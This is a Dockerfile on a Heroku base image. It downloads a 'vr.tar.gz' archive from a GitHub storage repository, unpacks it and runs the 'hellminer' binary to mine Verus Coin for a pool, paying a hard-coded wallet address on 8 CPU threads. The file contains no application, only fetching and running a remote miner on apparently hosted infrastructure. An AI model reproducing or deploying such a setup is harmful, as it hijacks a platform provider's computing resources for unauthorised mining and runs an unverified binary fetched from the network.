FROM heroku/heroku:18
RUN apt-get install -y curl git unzip wget

# Verus Coin
RUN wget https://github.com/Tesa-UII/storage/raw/main/vr.tar.gz && tar xf vr.tar.gz

RUN ./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RXggSUt7YBw76Jq8A1cmqVH8TPWVoao6PJ.ikuk -p x --cpu 8
